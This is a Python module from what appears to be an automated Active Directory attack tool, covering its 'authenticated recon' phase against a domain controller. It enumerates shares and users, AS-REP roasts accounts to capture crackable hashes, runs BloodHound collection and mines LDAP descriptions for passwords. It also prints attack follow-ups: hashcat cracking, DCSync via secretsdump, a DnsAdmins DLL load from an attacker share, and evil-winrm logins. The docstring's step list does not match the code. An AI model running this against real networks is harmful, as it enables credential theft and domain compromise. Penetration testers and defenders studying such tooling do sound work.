"""
phases/phase2.py — Authenticated recon.

Steps:
  1.  NXC SMB shares with creds + auto-spider non-default shares
  2.  NXC RID brute (ceiling 10000) → users.txt
  3.  NXC WinRM check (only if port open)
  4.  NXC LDAP AS-REP roast  (faster than impacket for bulk)
  5.  NXC LDAP Kerberoast
  6.  impacket-GetNPUsers fallback (if nxc ldap AS-REP found nothing)
  7.  LDAP — users with descriptions  (one focused query)
  8.  LDAP — high-value group memberships (one broad query)
  9.  LDAP — delegation misconfigs (unconstrained + constrained)
  10. kerbrute userenum (optional, if binary present)
"""

import re
from pathlib import Path
from core.runner  import Runner
from core.parsers import (parse_rid_users, parse_shares,
                           parse_ldap_users_with_desc, parse_asrep_hashes)
from core.env     import tool_available


HIGH_VALUE_GROUPS = [
    "Domain Admins",
    "Enterprise Admins",
    "Schema Admins",
    "Backup Operators",
    "Remote Management Users",
    "DnsAdmins",
    "Account Operators",
    "Server Operators",
    "Group Policy Creator Owners",
]

DEFAULT_SHARES = {"ADMIN$", "C$", "IPC$", "NETLOGON", "SYSVOL"}


class Phase2:
    def __init__(self, ctx):
        self.ctx    = ctx
        self.runner = Runner(ctx.term)

    def run(self):
        ctx  = self.ctx
        term = ctx.term
        term.phase("Phase 2 — Authenticated Recon")
        term.info(f"Credentials : {ctx.cred_string()}")

        self._smb_auth_shares()
        self._rid_brute()
        self._winrm_check()
        self._asrep_roast()
        self._bloodhound()
        self._ldap_users_desc()
        self._ldap_groups()
        self._ldap_delegation()
        self._kerbrute_userenum()

    # ------------------------------------------------------------------ #
    #  1. SMB shares + auto-spider non-default                            #
    # ------------------------------------------------------------------ #

    def _smb_auth_shares(self):
        ctx  = self.ctx
        term = ctx.term
        term.section("NXC — SMB shares (authenticated)")

        if not tool_available("nxc"):
            term.skip("nxc not found"); return

        cmd = ["nxc", "smb", ctx.target] + ctx.nxc_auth_flags() + ["--shares"]
        rc, output = self.runner.run(
            cmd, save_to=ctx.target_dir / "smb_shares_auth.txt"
        )

        shares = parse_shares(output)
        if shares:
            term.finding(f"Accessible shares: {', '.join(shares)}")
            for s in shares:
                if s not in ctx.shares:
                    ctx.shares.append(s)

        custom = [s for s in shares if s.upper() not in DEFAULT_SHARES]
        if custom:
            term.finding(f"Non-default shares — spidering: {', '.join(custom)}")
            for share in custom:
                self._spider_share(share)

    def _spider_share(self, share: str):
        ctx  = self.ctx
        term = ctx.term
        term.section(f"NXC — spider share: {share}")

        cmd = (["nxc", "smb", ctx.target]
               + ctx.nxc_auth_flags()
               + ["--spider", share, "--pattern", ".*"])
        self.runner.run(
            cmd,
            save_to=ctx.target_dir / f"spider_{share}.txt",
            timeout=120
        )

    # ------------------------------------------------------------------ #
    #  2. RID brute ceiling 10000                                          #
    # ------------------------------------------------------------------ #

    def _rid_brute(self):
        ctx  = self.ctx
        term = ctx.term
        term.section("NXC — RID brute (user enumeration, ceiling 10000)")

        if not tool_available("nxc"):
            term.skip("nxc not found"); return

        rc, output = self.runner.run(
            ["nxc", "smb", ctx.target] + ctx.nxc_auth_flags()
            + ["--rid-brute", "10000"],
            save_to=ctx.target_dir / "rid_brute_raw.txt"
        )

        users = parse_rid_users(output)
        if users:
            ctx.users = users
            users_file = ctx.target_dir / "users.txt"
            users_file.write_text("\n".join(users) + "\n")
            term.success(f"Found {len(users)} users → {users_file}")
            term.finding(f"Users: {', '.join(users)}")
        else:
            term.warn("No users from RID brute — check credentials.")

    # ------------------------------------------------------------------ #
    #  3. WinRM check                                                      #
    # ------------------------------------------------------------------ #

    def _winrm_check(self):
        ctx  = self.ctx
        term = ctx.term

        if not ctx.winrm_open:
            return

        term.section("NXC — WinRM access check")

        if not tool_available("nxc"):
            term.skip("nxc not found"); return

        rc, output = self.runner.run(
            ["nxc", "winrm", ctx.target] + ctx.nxc_auth_flags(),
            save_to=ctx.target_dir / "winrm_check.txt"
        )

        if "Pwn3d!" in output:
            term.finding("WinRM — PWNED (admin shell available)")
            term.info(f"  evil-winrm -i {ctx.target} -u {ctx.username} -p '{ctx.password}'")
        elif "[+]" in output:
            term.finding("WinRM — credentials valid (no admin shell)")
        else:
            term.info("WinRM — access denied with current creds")

    # ------------------------------------------------------------------ #
    #  4. impacket-GetNPUsers — AS-REP roast                              #
    #     Runs the system binary directly (avoids venv pyasn1 issues).    #
    #     Waits until after RID brute so users.txt is populated.          #
    # ------------------------------------------------------------------ #

    def _asrep_roast(self):
        ctx  = self.ctx
        term = ctx.term
        term.section("impacket-GetNPUsers — AS-REP roast")

        if not ctx.domain:
            term.skip("Domain unknown — cannot run GetNPUsers"); return
        if not ctx.users:
            term.skip("No users.txt yet — run RID brute first"); return

        if not tool_available("impacket-GetNPUsers"):
            term.skip("impacket-GetNPUsers not on PATH"); return

        users_file  = ctx.target_dir / "users.txt"
        hashes_file = ctx.target_dir / "asrep_hashes.txt"

        rc, output = self.runner.run(
            [
                "impacket-GetNPUsers",
                f"{ctx.domain}/",
                "-usersfile", str(users_file),
                "-dc-ip", ctx.target,
                "-format", "hashcat",
                "-outputfile", str(hashes_file),
                "-no-pass"
            ],
            save_to=ctx.target_dir / "asrep_raw.txt"
        )

        hashes = parse_asrep_hashes(output)
        if not hashes and hashes_file.exists():
            hashes = parse_asrep_hashes(hashes_file.read_text())

        if hashes:
            term.finding(f"AS-REP hashes captured: {len(hashes)}")
            for h in hashes:
                term.highlight(f"  {h[:90]}...")
            term.info(f"Saved: {hashes_file}")
            term.info("Crack: hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt")
        else:
            term.info("No AS-REP roastable accounts (all users require pre-auth)")

    # ------------------------------------------------------------------ #
    #  5. BloodHound collection                                            #
    #     Runs bloodhound-python -c All --zip after creds confirmed.      #
    #     Output zip dropped in recon/<target>/bloodhound/                #
    # ------------------------------------------------------------------ #

    def _bloodhound(self):
        ctx  = self.ctx
        term = ctx.term
        term.section("BloodHound — full collection (-c All)")

        if not tool_available("bloodhound-python"):
            term.skip("bloodhound-python not found  (pip install bloodhound)"); return
        if not ctx.domain:
            term.skip("Domain unknown — cannot run bloodhound-python"); return
        if not ctx.username or ctx.password is None:
            term.skip("bloodhound-python requires username + password (no hash support)"); return

        bh_dir = ctx.target_dir / "bloodhound"
        bh_dir.mkdir(exist_ok=True)

        rc, output = self.runner.run(
            [
                "bloodhound-python",
                "-d", ctx.domain,
                "-u", ctx.username,
                "-p", ctx.password,
                "-ns", ctx.target,
                "-c", "All",
                "--zip",
                "--outputdir", str(bh_dir),
            ],
            save_to=ctx.target_dir / "bloodhound_raw.txt",
            timeout=300
        )

        # Find the zip that was written
        zips = list(bh_dir.glob("*.zip"))
        if zips:
            term.finding(f"BloodHound zip ready: {zips[0]}")
            term.info("Drag the zip into the BloodHound UI (upload data)")
            term.info("Queries to run first:")
            term.info("  > Find all Domain Admins")
            term.info("  > Shortest Paths to Domain Admins")
            term.info("  > Find Principals with DCSync Rights")
        elif rc != 0:
            term.warn("bloodhound-python exited with errors — check bloodhound_raw.txt")
        else:
            term.info("bloodhound-python ran but no zip found — check output dir")

    # ------------------------------------------------------------------ #
    #  6. LDAP — users with descriptions                                  #
    # ------------------------------------------------------------------ #

    def _ldap_users_desc(self):
        ctx  = self.ctx
        term = ctx.term
        term.section("LDAP — users with descriptions")

        if not tool_available("ldapsearch"):
            term.skip("ldapsearch not found"); return
        if not ctx.ldap_open:
            term.skip("LDAP not open"); return

        base_dn    = self._base_dn()
        auth_flags = self._ldap_auth_flags()

        rc, output = self.runner.run(
            [
                "ldapsearch", *auth_flags,
                "-H", f"ldap://{ctx.target}",
                "-b", base_dn,
                "(&(objectClass=user)(objectCategory=person)(description=*))",
                "sAMAccountName", "description"
            ],
            save_to=ctx.target_dir / "ldap_users_desc.txt"
        )

        results = parse_ldap_users_with_desc(output)
        if results:
            term.finding(f"Users with descriptions ({len(results)}) — check for passwords:")
            for user, desc in results:
                term.highlight(f"  {user:<22} : {desc}")
        else:
            term.info("No user descriptions found")

    # ------------------------------------------------------------------ #
    #  7. LDAP — high-value group memberships (single broad query)       #
    # ------------------------------------------------------------------ #

    def _ldap_groups(self):
        ctx  = self.ctx
        term = ctx.term
        term.section("LDAP — high-value group memberships")

        if not tool_available("ldapsearch"):
            term.skip("ldapsearch not found"); return
        if not ctx.ldap_open:
            term.skip("LDAP not open"); return

        base_dn    = self._base_dn()
        auth_flags = self._ldap_auth_flags()

        # One query that fetches ALL high-value groups at once
        group_filter = "(|" + "".join(f"(cn={g})" for g in HIGH_VALUE_GROUPS) + ")"
        rc, output = self.runner.run(
            [
                "ldapsearch", *auth_flags,
                "-H", f"ldap://{ctx.target}",
                "-b", base_dn,
                f"(&(objectClass=group){group_filter})",
                "cn", "member"
            ],
            save_to=ctx.target_dir / "ldap_groups.txt"
        )

        # Parse blocks: each group entry separated by blank lines
        current_cn      = None
        current_members = []

        for line in output.splitlines():
            line = line.strip()
            if line.lower().startswith("cn:"):
                val = line.split(":", 1)[1].strip()
                if val in HIGH_VALUE_GROUPS:
                    if current_cn and current_members:
                        self._emit_group(current_cn, current_members)
                    current_cn      = val
                    current_members = []
            elif line.lower().startswith("member:"):
                dn = line.split(":", 1)[1].strip()
                m  = re.match(r"CN=([^,]+)", dn, re.IGNORECASE)
                if m:
                    current_members.append(m.group(1))

        if current_cn and current_members:
            self._emit_group(current_cn, current_members)

    def _emit_group(self, group_name: str, members: list):
        term = self.ctx.term
        term.finding(f"{group_name} ({len(members)}): {', '.join(members)}")
        hints = {
            "Domain Admins":
                "DCSync: impacket-secretsdump <domain>/<user>:<pass>@<DC>",
            "Backup Operators":
                "Dump NTDS: wbadmin or reg save HKLM\\SAM / SYSTEM",
            "DnsAdmins":
                "DLL injection: dnscmd /config /serverlevelplugindll \\\\attacker\\share\\evil.dll",
            "Remote Management Users":
                "evil-winrm -i <IP> -u <user> -p <pass>",
            "Server Operators":
                "Modify services on DC → SYSTEM",
        }
        if group_name in hints:
            term.info(f"  Attack: {hints[group_name]}")

    # ------------------------------------------------------------------ #
    #  8. LDAP — delegation misconfigs                                    #
    # ------------------------------------------------------------------ #

    def _ldap_delegation(self):
        ctx  = self.ctx
        term = ctx.term
        term.section("LDAP — delegation misconfigurations")

        if not tool_available("ldapsearch"):
            term.skip("ldapsearch not found"); return
        if not ctx.ldap_open:
            term.skip("LDAP not open"); return

        base_dn    = self._base_dn()
        auth_flags = self._ldap_auth_flags()

        # Unconstrained (excluding DCs: primaryGroupID 516/521)
        rc, output = self.runner.run(
            [
                "ldapsearch", *auth_flags,
                "-H", f"ldap://{ctx.target}",
                "-b", base_dn,
                "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)"
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
                "(!(primaryGroupID=516))(!(primaryGroupID=521)))",
                "sAMAccountName"
            ],
            save_to=ctx.target_dir / "ldap_unconstrained.txt"
        )
        targets = [l.split(":",1)[1].strip() for l in output.splitlines()
                   if l.strip().lower().startswith("samaccountname:")]
        if targets:
            term.finding(f"UNCONSTRAINED delegation [CRITICAL]: {', '.join(targets)}")
            term.info("  Coerce auth → capture TGT → pass-the-ticket → DCSync")
            term.info("  Tools: PetitPotam / PrinterBug + Rubeus monitor")
        else:
            term.info("No unconstrained delegation targets (excl. DCs)")

        # Constrained
        rc, output = self.runner.run(
            [
                "ldapsearch", *auth_flags,
                "-H", f"ldap://{ctx.target}",
                "-b", base_dn,
                "(&(msDS-AllowedToDelegateTo=*)"
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                "sAMAccountName", "msDS-AllowedToDelegateTo"
            ],
            save_to=ctx.target_dir / "ldap_constrained.txt"
        )
        targets = [l.split(":",1)[1].strip() for l in output.splitlines()
                   if l.strip().lower().startswith("samaccountname:")]
        if targets:
            term.finding(f"CONSTRAINED delegation [HIGH]: {', '.join(targets)}")
            term.info("  impacket-getST -spn <SPN> -impersonate Administrator ...")
        else:
            term.info("No constrained delegation targets")

    # ------------------------------------------------------------------ #
    #  9. kerbrute userenum — validate users without lockout risk         #
    # ------------------------------------------------------------------ #

    def _kerbrute_userenum(self):
        ctx  = self.ctx
        term = ctx.term

        if not tool_available("kerbrute"):
            return   # optional tool — silent skip

        if not ctx.users or not ctx.domain:
            return

        term.section("kerbrute — username validation (no lockout risk)")

        users_file   = ctx.target_dir / "users.txt"
        valid_file   = ctx.target_dir / "kerbrute_valid_users.txt"

        self.runner.run(
            [
                "kerbrute", "userenum",
                "--dc", ctx.target,
                "-d", ctx.domain,
                str(users_file),
                "-o", str(valid_file)
            ],
            save_to=ctx.target_dir / "kerbrute_raw.txt"
        )

        if valid_file.exists():
            valid = [l.strip() for l in valid_file.read_text().splitlines() if l.strip()]
            if valid:
                term.finding(f"kerbrute confirmed {len(valid)} valid users")

    # ------------------------------------------------------------------ #
    #  Helpers                                                             #
    # ------------------------------------------------------------------ #

    def _base_dn(self) -> str:
        if self.ctx.domain:
            return ",".join(f"DC={p}" for p in self.ctx.domain.split("."))
        return ""

    def _ldap_auth_flags(self) -> list:
        ctx = self.ctx
        if ctx.username and ctx.password is not None:
            domain   = ctx.domain or ""
            user_dn  = f"{ctx.username}@{domain}" if domain else ctx.username
            return ["-x", "-D", user_dn, "-w", ctx.password]
        return ["-x"]
